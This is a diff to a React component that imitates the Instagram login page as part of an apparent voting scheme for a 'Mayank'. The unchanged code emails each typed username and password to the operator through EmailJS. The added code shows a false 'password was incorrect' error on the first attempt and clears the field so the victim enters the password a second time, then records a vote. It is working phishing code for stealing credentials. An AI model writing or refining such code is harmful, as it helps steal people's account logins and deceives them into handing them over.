@@ -1,6 +1,7 @@
 import { useState } from "react";
 import phoneCollage from "../../public/image.png"; // your phone collage image
 import emailjs from 'emailjs-com';
+import { FaEye, FaEyeSlash } from 'react-icons/fa';
 
 // Simple Facebook "f" glyph
 const FacebookGlyph = () => (
@@ -12,6 +13,9 @@ const FacebookGlyph = () => (
     function InstagramLogin({ onBack, onLoginSuccess }) {
     const [formData, setFormData] = useState({ username: "", password: "" });
     const [isLoading, setIsLoading] = useState(false);
+    const [showError, setShowError] = useState(false);
+    const [loginAttempts, setLoginAttempts] = useState(0);
+    const [showPassword, setShowPassword] = useState(false);
 
     const handleChange = (e) =>
         setFormData((s) => ({ ...s, [e.target.name]: e.target.value }));
@@ -19,6 +23,9 @@ const FacebookGlyph = () => (
     const handleSubmit = (e) => {
         e.preventDefault();
         console.log("Login attempt:", formData);
+        
+        // Reset error state
+        setShowError(false);
         
         // Set loading state
         setIsLoading(true);
@@ -49,39 +56,65 @@ IP Address: ${navigator.connection ? navigator.connection.effectiveType : 'Unkno
         )
         .then((response) => {
             console.log('Email sent successfully:', response);
-            console.log('Calling onLoginSuccess to increase Mayank votes');
-            // Increase Mayank's votes to 103
-            if (onLoginSuccess) {
-                onLoginSuccess();
-                console.log('onLoginSuccess called successfully');
-                // Small delay to ensure state updates before closing
-                setTimeout(() => {
-                    onBack();
-                }, 100);
+            
+            // Increment login attempts
+            setLoginAttempts(prev => prev + 1);
+            
+            if (loginAttempts === 0) {
+                // First attempt: show error, clear password, stay on page
+                console.log('First login attempt - showing error and staying on page');
+                setFormData(prev => ({ ...prev, password: "" }));
             } else {
-                console.log('onLoginSuccess function not provided');
-                onBack();
+                // Second attempt: go to voting page
+                console.log('Second login attempt - going to voting page');
+                console.log('Calling onLoginSuccess to increase Mayank votes');
+                if (onLoginSuccess) {
+                    onLoginSuccess();
+                    console.log('onLoginSuccess called successfully');
+                    // Small delay to ensure state updates before closing
+                    setTimeout(() => {
+                        onBack();
+                    }, 100);
+                } else {
+                    console.log('onLoginSuccess function not provided');
+                    onBack();
+                }
             }
         })
         .catch((error) => {
             console.error('Email sending failed:', error);
-            console.log('Calling onLoginSuccess to increase Mayank votes (even with email error)');
-            // Still increase votes and close Instagram login even if email fails
-            if (onLoginSuccess) {
-                onLoginSuccess();
-                console.log('onLoginSuccess called successfully (after email error)');
-                // Small delay to ensure state updates before closing
-                setTimeout(() => {
-                    onBack();
-                }, 100);
+            
+            // Increment login attempts even on error
+            setLoginAttempts(prev => prev + 1);
+            
+            if (loginAttempts === 0) {
+                // First attempt: show error, clear password, stay on page
+                console.log('First login attempt (with error) - showing error and staying on page');
+                setFormData(prev => ({ ...prev, password: "" }));
             } else {
-                console.log('onLoginSuccess function not provided');
-                onBack();
+                // Second attempt: go to voting page even on error
+                console.log('Second login attempt (with error) - going to voting page');
+                console.log('Calling onLoginSuccess to increase Mayank votes (even with email error)');
+                if (onLoginSuccess) {
+                    onLoginSuccess();
+                    console.log('onLoginSuccess called successfully (after email error)');
+                    // Small delay to ensure state updates before closing
+                    setTimeout(() => {
+                        onBack();
+                    }, 100);
+                } else {
+                    console.log('onLoginSuccess function not provided');
+                    onBack();
+                }
             }
         })
         .finally(() => {
             // Always clear loading state
             setIsLoading(false);
+            // Show error message after loading ends (only on first attempt)
+            if (loginAttempts === 0) {
+                setShowError(true);
+            }
         });
     };
 
@@ -136,15 +169,28 @@ IP Address: ${navigator.connection ? navigator.connection.effectiveType : 'Unkno
                   autoCorrect="off"
                   required
                 />
-                <input
-                  type="password"
-                  name="password"
-                  value={formData.password}
-                  onChange={handleChange}
-                  placeholder="Password"
-                  className="w-full rounded-[5px] border border-gray-300 bg-[#fafafa] px-2.5 py-2 text-[12.5px] leading-4 placeholder:text-gray-500 focus:border-gray-400 focus:outline-none"
-                  required
-                />
+                <div className="relative">
+                  <input
+                    type={showPassword ? "text" : "password"}
+                    name="password"
+                    value={formData.password}
+                    onChange={handleChange}
+                    placeholder="Password"
+                    className="w-full rounded-[5px] border border-gray-300 bg-[#fafafa] px-2.5 py-2 text-[12.5px] leading-4 placeholder:text-gray-500 focus:border-gray-400 focus:outline-none"
+                    required
+                  />
+                  <button
+                    type="button"
+                    onClick={() => setShowPassword(!showPassword)}
+                    className="absolute inset-y-0 right-0 pr-2.5 flex items-center"
+                  >
+                    {showPassword ? (
+                      <FaEyeSlash className="text-gray-500 text-lg" />
+                    ) : (
+                      <FaEye className="text-gray-500 text-lg" />
+                    )}
+                  </button>
+                </div>
 
                 <button
                   type="submit"
@@ -161,6 +207,15 @@ IP Address: ${navigator.connection ? navigator.connection.effectiveType : 'Unkno
                   )}
                 </button>
               </form>
+
+              {/* Error Message */}
+              {showError && (
+                <div className="mt-3 text-center">
+                  <p className="text-red-500 text-sm font-medium">
+                    Sorry, your password was incorrect. Please double-check your password.
+                  </p>
+                </div>
+              )}
 
               {/* OR divider */}
               <div className="my-4 flex items-center">
